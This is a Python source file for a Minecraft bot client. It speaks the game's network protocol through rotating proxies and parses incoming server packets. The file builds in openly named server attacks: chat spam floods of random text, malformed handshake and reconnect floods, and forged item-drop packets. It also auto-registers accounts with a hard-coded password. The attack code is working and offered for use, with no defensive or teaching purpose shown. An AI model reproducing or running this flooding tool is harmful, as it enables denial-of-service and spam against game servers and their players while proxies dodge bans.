# -*- coding: utf-8 -*-
from SyncPrint import *
mchars="abcdefghilmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ123456789!\/"
import socks, urllib2, struct, threading, time, binascii, re, sys, random, string, ProxyManager,socket
def dummy(x,y):
	pass
ids = [46,49,7,57,322]
def CraftString(text):
	return CraftStringMed(text)
	return struct.pack(">h", len(text)) + text.encode("utf_16_be") 
def CraftStringMed(text):
        return struct.pack(">h", len(text)) + "\x00" + "\x00".join(list(text))
def CraftStringOld(text):
        msg = "\x00" + "\x00".join(list(text))
	return chr(len(text))+msg
class CraftPlayer:
	_printChat = False
	_nickname = ''
	_password = ''
	_proxy = ''
	_sessionId = ''
	_loggedIn = False
	_server = ''
	_coordX = 0
	_coordY = 0
	_coordZ = 0
	_sdebug = False
	_attacks = False
	_prependFlood = False
	def _action(self):
		try:
			self._socket.sendall("\x03" + CraftString(self._queuedMessages.pop(0)))
		except:
			pass
		try:
			if self._connreconn:
				self._socket.close()
				self._connreconn = False
			for x in self._attacks:
				if x == "sM":
					self._attacks.remove("sM")
					prepend = self._prependFlood
					msg = self._msg
					if msg == "":
						self._socket.sendall("\x03" + CraftString(prepend+"".join(random.choice(mchars) for x in range(random.randint(8,90-len(prepend))))))
					else:
						self._socket.sendall("\x03" + CraftString(msg))
				if x == "chatFlood":
					prepend = self._prependFlood
					msg = self._msg
					if msg == "":
						self._socket.sendall("\x03" + CraftStringMed(prepend+"".join(random.choice(mchars) for x in range(random.randint(8,90-len(prepend))))))
					else:
						self._socket.sendall("\x03" + CraftStringMed(msg))
				if x == "creativeDrop":
					self._socket.sendall("\x6B\xFF\xFF" +  struct.pack(">h",random.choice(ids)) + "\x40\x00\x00")
				if x == "tO":
					print "timeouting!"
					time.sleep(31)
				if x == "pFlood":
					x=0
					self._socket.sendall("\x01" + CraftString("a"*15 + ";" + "a"*50))
					self._socket.close()
				if x == "reconnectFlood":
					self._socket.close()
					self._log ( "Reconnecting..." )
		except:
			pass
	def __init__(self, nick, password="", proxy="", server="", isOffline=False, printchat=False, debug=False, attacks=[], prependFlood="", msg="", count=5, callback=dummy, eventHook=None):
		self._queuedMessages=list()
		self._kre=False
		self._eHook = eventHook
		self._connreconn = False
		self._msg = msg
		self._count = count
		self._nickname = nick
		self._password = password
		self._printChat = printchat
		self._server = server
		self._isOffline = isOffline
		if proxy != None:
			self._proxy = ProxyManager.getProxy()
		self._loggedIn = False
		self._sdebug = debug
		self._attacks = attacks
		self._prependFlood = prependFlood
		self._callback = callback
		self._isConnected = False
	def _connect(self):
		try:
			self._socket.close()
		except:
			pass
		self._socket = socks.socksocket()
		self._socket.settimeout(5)
		try:
			self._proxtypeserver, self._proxport = self._proxy.split(":")
			self._proxtype, self._proxserver = self._proxtypeserver.split("|")
			self._socket.setproxy(eval("socks.PROXY_TYPE_" + self._proxtype), self._proxserver, int(self._proxport))
		except:
			ProxyManager.badProxy(self._proxy)
			pass
		try:
			_serverip, _serverport = self._server
			self._socket.connect((_serverip, _serverport))
			self._socket.sendall("\x02" + CraftString(self._nickname+";"+_serverip+":"+str(_serverport)))
		except:
			ProxyManager.badProxy(self._proxy)
			return
		try:
			self._socket.settimeout(35)
			kz = self._startLoop()
			if kz == "KE":
				self._callback("KE", self)
		except:
			if self._sdebug: raise
			return
	def _startLoop(self):
		return self._runLoop()
	def _getBytes(self,_sz):
		data=""
		osz = _sz
		while _sz != 0:
			data += self._socket.recv(_sz)
			_sz = osz - len(data)
		return data
	def _log(self,text):
		pr = self._proxy.split("|")
		if self._proxy == None:
			pr = ("None", "")
		syncprint('[{:6}|{:20}] - [{:20}] - {:}'.format(pr[0], pr[1], self._nickname, text))
	def _debug(self,text):
		if self._sdebug:
			self._log(text)
		pass
	def _readString(self):
        	lent = int(binascii.b2a_hex(self._getBytes(1)),16)
        	try:
        	        retn = self._getBytes(lent*2)                   
        	except:
	                return ""
        	result=re.sub(r'\xA7\x00..', '', retn)
	        return "".join(result.split("\x00"))
	def _readStringLong(self):
        	lent = int(binascii.b2a_hex(self._getBytes(2)),16)
        	try:
        	        retn = self._getBytes(lent*2)                   
        	except:
	                return ""
        	result=re.sub(r'\xA7\x00..', '', retn)
	        return "".join(result.split("\x00"))
	def _genMetadata(self):
		metadata = {}
		x = ord(self._getBytes(1))
		while x != 127:
			index = x & 0x1F # Lower 5 bits
			ty    = x >> 5   # Upper 3 bits
			if ty == 0: val = ord(self._getBytes(1))
			if ty == 1: val = self._getBytes(2)
			if ty == 2: val = self._getBytes(4)
			if ty == 3: val = self._getBytes(4)
			if ty == 4: val = self._readString()
			if ty == 5:
				val = {}
				val["id"]     = self._getBytes(2)
				val["count"]  = self._getBytes(1)
				val["damage"] = self._getBytes(2)
			if ty == 6:
				val = []
				for i in range(3):
					val.append(self._getBytes(4))
			metadata[index] = (ty, val)
			x = ord(self._getBytes(1))
		return metadata
	def _itemEnchant(self,item):
		value = item
		return (256 <= value and value <= 259) or (267 <= value and value <= 279) or (283 <= value and value <= 286) or (290 <= value and value <= 294) or (298 <= value and value <= 317) or value == 261 or value == 359 or value == 346;
	def _readSlot(self):
		item = int(binascii.b2a_hex(self._getBytes(2)), 16)
		if item != 65535:
			count = ord(self._getBytes(1))
			damage = int(binascii.b2a_hex(self._getBytes(2)),16)
			if self._itemEnchant(item):
				len = int(binascii.b2a_hex(self._getBytes(2)),16)
				if len == 65535:
					return
				while len != 0:
					self._getBytes(1)
					len = len - 1
	def _runLoop(self):
	 while True:
		try:
			_packet = self._getBytes(1)
		except:
			_packet = "ER"
		if self._count == 0:
			self._action()
			self._count = 20
		self._count = self._count - 1
		if self._eHook != None:
			if self._eHook(_packet,self) == True:
				continue
		if _packet == "\x00":
			self._debug ( "Ping" )
			self._socket.sendall("\x00" + self._getBytes(4) )
		elif _packet == "\x01":
			self._debug( "Login packet" )
			self._log ( "Connected!" )
			self._getBytes(4)
			self._readStringLong()
			self._readStringLong()
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(1)
			self._getBytes(1)
		elif _packet == "\x02":
			# Handshake
			ProxyManager.coolProxy(self._proxy)
			server_packet = self._readStringLong()
			self._debug( "Handshake packet [" + server_packet + "]" )
			self._isOffline = True
			self._isConnected = True
			if server_packet == "-":
				server_packet = "+"
			if server_packet != "+" and self._password != "":
				self._isOffline = False
				while True:
					_data = "user=" + self._nickname + "&password=" + self._password + "&version=12"
					opener = urllib2.urlopen
					if self._proxy != None:
						opener = urllib2.build_opener(urllib2.ProxyHandler({'https': self._proxserver + ":" + self._proxport}))
						openURL = opener.open
					_handle = openURL("https://login.minecraft.net/", data=_data)			
					_retdata = _handle.read().split(":")
					try:
						_version, _deprecated, self._nickname, self._sessionId = _retdata
					except:
						self._log ( "Error! [" + ":".join(_retdata) + "]" )
						if _retdata.find("Too many") == -1:
							return "KE"
						continue
					_answer = urllib2.urlopen("http://session.minecraft.net/game/joinserver.jsp?user=" + self._nickname + "&sessionId=" + self._sessionId + "&serverId=" + server_packet).read()
					if _answer != "OK":
						self._log ( "Oops! ["+_answer+"]" )
						self._sessionId = ""
						continue
					self._loggedIn=True
					break
			self._socket.sendall("\x01\x00\x00\x00\x1d"+CraftString(self._nickname)+"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00")
			self._socket.settimeout(20)
		elif _packet == "\x03":
			msg = self._readStringLong()
			if self._printChat == True:
				self._log ( "Chat message [" + msg + "]" )
			else:
				self._debug ( "Chat message [" + msg + "]" )
			if self._loggedIn == False:
				if msg.find("login") != -1:
					self._log("Logging in!")
                                        self._queuedMessages.append("/login omfg1336")
					self._loggedIn=True
				if msg.find("register") != -1:
					self._log("Registering! [" + msg + "]")
					self._queuedMessages.append("/register omfg1336")
					self._queuedMessages.append("/setpassword omfg1336")
					self._queuedMessages.append("/register omfg1336 omfg1336")
					self._queuedMessages.append("/login omfg1336")
					self._loggedIn=True
		elif _packet == "\x04":
			self._debug( "Time Packet" )
			self._getBytes(8)
		elif _packet == "\x05":
			self._debug( "Entity Equipment" )
			self._getBytes(10)
	        elif _packet == "\x06":
			self._debug( "Spawn Position [X:"+str(int(binascii.b2a_hex(self._getBytes(4)),16))+", Y:"+str(int(binascii.b2a_hex(self._getBytes(4)),16))+", Z:"+str(int(binascii.b2a_hex(self._getBytes(4)),16))+"]" )
	        elif _packet == "\x08":
			self._debug( "Health Update" )
			self._getBytes(2)
			self._getBytes(2)
			self._getBytes(4)
        	elif _packet == "\x09":
			self._debug( "Respawn" )
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(1)
			self._getBytes(2)
			self._debug( self._readStringLong() )
        	elif _packet == "\x0D":
			self._debug( "Player Position & Look" )
			self._getBytes(8)
			self._getBytes(8)
			self._getBytes(8)
			self._getBytes(8)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(1)
        	elif _packet == "\x11":
			self._debug( "Use Bed" )
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(4)
        	elif _packet == "\x12":
			self._debug( "Animation" )
			self._getBytes(4)
			self._getBytes(1)
	        elif _packet == "\x14":
			self._getBytes(5)
			self._debug( "Player Spawn ["+self._readString()+"]" )
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(1)
			self._getBytes(2)
		elif _packet == "\x15":
			self._debug( "Pickup Spawn" )
			self._getBytes(4)
			self._getBytes(2)
			self._getBytes(1)
			self._getBytes(2)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(1)
			self._getBytes(1)
		elif _packet == "\x16":
			self._debug( "Collect Item" )
			self._getBytes(4)
			self._getBytes(4)
		elif _packet == "\x17":
			#assert self._getBytes(1) == "\x00"
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			lolz = "Normal"
			if self._getBytes(4) != "\x00\x00\x00\x00":
				lolz = "Fireball"
				self._getBytes(2)
				self._getBytes(2)
				self._getBytes(2)
			self._debug( "Add Object/Vehicle [" + lolz + "]" )
		elif _packet == "\x18":
			self._debug( "Mob Spawn" )
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(1)
			self._getBytes(1)
			self._genMetadata()
	        elif _packet == "\x19":
			self._getBytes(4)
			self._debug( "Painting [" + self._readStringLong() + "]" )
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
		elif _packet == "\x1A":
			self._debug( "Experience Drop" )
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(2)
		elif _packet == "\x1C":
	                self._debug( "Entity Velocity" )
        	        self._getBytes(4)
                	self._getBytes(2)
                	self._getBytes(2)
                	self._getBytes(2)
	        elif _packet == "\x1D":
        	        self._debug( "Destroy Entity" )
                	self._getBytes(4)
	        elif _packet == "\x1E":
        	        self._debug( "Entity" )
                	self._getBytes(4)
	        elif _packet == "\x1F":
        	        self._debug( "Entity Relative Move" )
                	self._getBytes(4)
	                self._getBytes(1)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	elif _packet == "\x20":
                	self._debug( "Entity Look" )
        	        self._getBytes(4)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	elif _packet == "\x21":
        	        self._debug( "Entity Look and Relative Move" )
        	        self._getBytes(4)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	        self._getBytes(1)
        	elif _packet == "\x22":
        	        self._debug( "Entity Teleport" )
        	        self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(1)
        	elif _packet == "\x23":
			self._debug( "Entity Head Look" )
                	self._getBytes(4)
                	self._getBytes(1)
        	elif _packet == "\x26":
                	self._debug( "Entity Status" )
                	self._getBytes(4)
                	self._getBytes(1)
        	elif _packet == "\x27":
                	self._debug( "Entity Attach" )
                	self._getBytes(4)
                	self._getBytes(4)
        	elif _packet == "\x28":
                	self._debug( "Entity Metadata" )
                	self._getBytes(4)
			self._genMetadata()
        	elif _packet == "\x29":
                	self._debug( "Entity Effect" )
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(1)
                	self._getBytes(2)
		elif _packet == "\x2A":
                	self._debug( "Remove Entity Effect" )
                	self._getBytes(4)
                	self._getBytes(1)
        	elif _packet == "\x2B":
                	self._debug( "Experience Update" )
                	self._getBytes(4)
                	self._getBytes(2)
                	self._getBytes(2)
        	elif _packet == "\x32":
			self._debug( "Pre-Chunk Packet" )
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(1)
        	elif _packet == "\x33":
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(2)
                	self._getBytes(2)
			lent = struct.unpack('>I', self._getBytes(4))[0]
                	self._getBytes(4)
                	self._debug( "Chunk Update [" + str(lent) +"]" )
			self._getBytes(lent)
        	elif _packet == "\x34":
                	self._debug( "Multi Block Change" )
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(1)
                	lentk = int(binascii.b2a_hex(self._getBytes(4)), 16)
			self._getBytes(lentk)
	        elif _packet == "\x35":
        	        self._debug( "Block Change" )
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(1)
        	elif _packet == "\x36":
                	self._debug( "Block Action" )
                	self._getBytes(4)
                	self._getBytes(2)
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(1)
        	elif _packet == "\x3C":
        	        self._debug( "Explosion" )
                	self._getBytes(8) 
                	self._getBytes(8)
                	self._getBytes(8)
                	self._getBytes(4)
                	lent = int(binascii.b2a_hex(self._getBytes(4)), 16)
			self._getBytes(lent)
			self._getBytes(lent)
			self._getBytes(lent)
        	elif _packet == "\x3D":
                	self._debug( "Sound/particle effect" )
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(4)
                	self._getBytes(4)
        	elif _packet == "\x46":
                	self._debug( "New/Inval_packet State" )
                	self._getBytes(1)
                	self._getBytes(1)
        	elif _packet == "\x47":
        	        self._debug( "Thunderbolt" )
                	self._getBytes(4)
                	self._getBytes(1)
                	self._getBytes(4)
                	self._getBytes(4)
                	self._getBytes(4)
        	elif _packet == "\x64":
                	self._getBytes(1)
                	self._getBytes(1)
                	self._debug( "Open window [" + self._readString() + "]" )
                	self._getBytes(1)
        	elif _packet == "\x65":
                	self._debug( "Close Window" )
                	self._getBytes(1)
        	elif _packet == "\x66":
			pass
        	elif _packet == "\x67":
        	        self._getBytes(3)
			self._debug( "Set Slot" )
			self._readSlot()
        	elif _packet == "\x68":
			self._getBytes(1)
			self._debug( "Set Window Items" )
			list = int(binascii.b2a_hex(self._getBytes(2)), 16)
			while list != 0:
				self._readSlot()
				list = list - 1
	        elif _packet == "\x69":
			pass
	        elif _packet == "\x6A":
			pass
	        elif _packet == "\x6C":
			pass
        	elif _packet == "\x82":
        	        self._getBytes(4)
                	self._getBytes(2)
                	self._getBytes(4)
			a=self._readStringLong()
			b=self._readStringLong()
			c=self._readStringLong()
			d=self._readStringLong()
			self._debug( "Update Sign [" + a + ":" + b + ":" + c + ":" + d + "]" )
        	elif _packet == "\x83":
                	self._debug( "Item Data" )
			self._getBytes(2)
			self._getBytes(2)
			sz = ord(self._getBytes(1))
			self._getBytes(sz)
        	elif _packet == "\x84":
                	self._debug( "Update Tile Entity" )
			self._getBytes(4)
			self._getBytes(2)
			self._getBytes(4)
			self._getBytes(1)
			self._getBytes(4)
			self._getBytes(4)
			self._getBytes(4)
	        elif _packet == "\xC8":
        	        self._debug( "Increment Statistic" )
                	self._getBytes(4)
                	self._getBytes(1)
        	elif _packet == "\xC9":
                	self._getBytes(1)
                	self._debug( "Player List Item [" + self._readString() + "]" )
                	self._getBytes(1)
                	self._getBytes(2)
        	elif _packet == "\xCA":
                	self._debug( "Player Abilities" )
                	self._getBytes(4)
        	elif _packet == "\xFA":
			self._debug( "Plugin message [" + self._readStringLong() + "]" )
                	sz = int(binascii.b2a_hex(self._getBytes(2)), 16)
			self._getBytes(sz)
	        elif _packet == "\xFF":
			rl = self._readStringLong()
			self._log( "Disconnected! [" + rl + "]" )
			self._isConnected = False
			try:
				self._socket.close()
			except:
				pass
			return
		elif _packet == "": pass
		elif _packet == "ER":
			if self._isConnected:
				self._log( "Disconnected! [Connection Error]")
			try:
				if "pFlood" in self._attacks and self._isConnected:
					self._isConnected = False
				else:
					self._socket.close()
			except:
				pass
			self._isConnected = False
			return
		else:
			if self._isConnected:
				self._log( "Disconnected! [Protocol Error]")
			try:
				self._socket.close()
				self._isConnected = False
			except:
				pass
			self._debug( "Unmatched Packet [" + binascii.b2a_hex(_packet) + "], out of sync?" )
 
